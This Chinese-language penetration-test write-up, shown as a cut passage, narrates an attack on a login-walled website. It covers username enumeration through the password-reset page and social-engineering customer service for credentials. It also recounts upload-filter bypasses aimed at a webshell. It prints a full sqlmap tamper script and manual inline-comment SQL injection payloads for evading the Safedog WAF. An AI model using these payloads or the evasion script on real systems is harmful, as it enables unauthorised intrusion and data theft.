奔跑在黑夜里的曙光
原创先锋情报站 酒仙桥六号部队
2020-08-27原文
这是 酒仙桥六号部队 的第 69 篇文章。
全文共计3792个字，预计阅读时长12分钟。
渗透真乃玄学和心细的一门学问，一次渗透就这么开始了，先上香
开光保佑，求佛祖保佑此次顺利畅游。
一、初探自闭
为什么自闭呢，因为看到这个站的时候首页必须登录，但没有注册
入口，也访问不了任何页面。
我 的 表 情 是 这 样 的 ◔
‸◔？（⊙.⊙），心中感觉凉了一半，放上万恶的此站的部分截图
。
自制字典目录杀器“御剑”也是如此碰壁，首页都扫不出来，此时
我怀疑该网站可能需要在登录验证以后才能访问相应的路径，神奇
的表情再次浮现 ◔ ‸◔？（⊙.⊙）。
抱着最后一腔热血的心，又掏出我的nmap一顿操作猛如虎，然后还
是同样的结局。
二、试探踩点
没有办法了那就从仅有的一个页面的功能点，开刀了，功夫不负有
心人，在忘记密码处，使用Burp枚举出一大批用户名并发现了一些
找回密码的规则，此处用户名枚举我采用了管理员常用用户名和中
文姓名拼音组合字典。
获取到该站的上百个用户以后，同时也发现了一些小规则，该站存
在两种用户类型，一是正常用户需要填写较为完整的资料进行修改
密码，二是因为资料未填写被冻结的用户，上边提示需要联系客服
进行改密，此时感觉又遇到阻碍，但是还是想去尝试一番，去和客
服进行深入的探讨。
开始和客服深入的探讨：
三、第一次碰壁
使用社工得到的账户密码登录，逛了一圈没发现什么可以利用的漏
洞，后来发现有一个更换背景的功能且此处可以上传自定义背景图
。
于是赶紧测一下有没有任意文件上传漏洞，如果存在任意文件上传
漏洞直接拿Shell一把梭，事实证明是我想多了，接着自闭。
先 是 绕 过 了 JS 和 ontent-
Type限制，然后修改为.php后缀上传时提示.php后缀不允许上传
，对内容进行了检查，有后缀黑名单限制，并且遇到了安全狗的防
护。
最终找了一个过狗的免杀马：
经过多次测试发现，当上传文件后缀为.php3和.php5时可以上传
成功，但是没有回显在服务器上的路径，而且背景图功能处也未发
现自定义上传图片的地址。
经过反复猜测和Fuzz，也没有找到正确的一句话木马路径，猜测上
传成功的PHP文件名也是随机的，遂放弃转而测试其他的漏洞。
四、黑暗的曙光
虽然前台功能特别少，但是还是幸运的找到了一处疑似sql注入点的
地方，在某处看到一个SQL语法的报错。
在username参数处测了下发现报错，本想sqlmap一把梭，奈何现
实不允许啊。
手动测了下，触发安全狗的防护。
再查看了其他的地方，也没找到什么特别好能拿Shell的利用点，没
办 法 硬 干 吧 ， 因 为 之 前 也 看 过 一 些 SQL 注 入 Bypass
Safedog4.0的文章 ：
https://www.cnblogs.com/zy-king-
karl/articles/11431863.html
所以尝试进行一下绕过。
一番搜集找到了大佬写过的tamper，心情大好，舒舒服服的把脚本
放到Kali里sqlmap的对应路径，这里贴上在先知社区看到的一篇ta
mper：
#!/usr/bin/env python
# -*- coding: UTF-8 -*-
from lib.core.enums import PRIORITY
from lib.core.settings import UNICODE_ENCODING
__priority__ = PRIORITY.LOWEST
def dependencies():
pass
def tamper(payload, **kwargs):
if payload:
payload=payload.replace("=","/*!*/=/*!*/")
payload=payload.replace("ORDER","/*!ORDER/*!/*/**/*/")
payload=payload.replace("AND","/*!AND/*!/*/**/*/")
payload=payload.replace("OR","/*!OR/*!/*/**/*/")
payload=payload.replace("UNION","/*!UNION/*!/*/**/*/")
payload=payload.replace("SELECT","/*!SELECT/*!/*/**/*/")
payload=payload.replace("USER()","/*!USER/*!/*/**/*/()/**/")
payload=payload.replace("DATABASE()","/*!DATABASE/*!/*/**/*/()/*
*/")
payload=payload.replace("VERSION()","/*!VERSION/*!/*/**/*/()/**/
")
payload=payload.replace("SESSION_USER()","/*!SESSION_USER/*!/*/*
*/*/()/**/")
payload=payload.replace("EXTRACTVALUE","/*!EXTRACTVALUE/*!/*/**/
*/()/**/")
payload=payload.replace("UPDATEXML","/*!UPDATEXML/*!/*/**/*/")
return payload
但是却跑不出来啊，很是疑惑，没办法只能硬干，正好积累学习一
下Bypass安全狗的一些技巧，于是查看一些大佬写的文章，知道了
安全狗默认就给很多扫描器屏蔽了，尤其是这种常见扫描器，当然
它的检测机制是识别的HTTP头，如果有大佬可以修改下sqlmap的特
征，我觉得应该也可以跑。
既然扫描工具行不通那就开启手注，因为前面的报错信息直接就暴
漏了路径，所以这里我也不研究爆破数据库了，直接考虑是否能写
入一句话木马，此时我内心也是希望对方网站的secure_file_pri
v的值为空，因为该值为空才允许导入导出文件。
接下来对如何绕过安全狗做一个简单解释：
1.绕过and 1=1
1. 首先得判断这个地方是否有注入点。
2. username=1' or 11=1 %23(安全狗拦截)
3. username=1' or %23(安全狗不拦截)
4.
所以要把and和11=1当成两部分，在它们之间进行干扰。经过一番测试用/*!..*/
内联注释就能绕过。
5. payload:
6. /*!..*/（在星号后加惊叹号，那么此解释里的语句将被执行）
7. username=1' or /*!11=1*/ %23 (安全狗不拦截)
8. 所以username处存在注入点。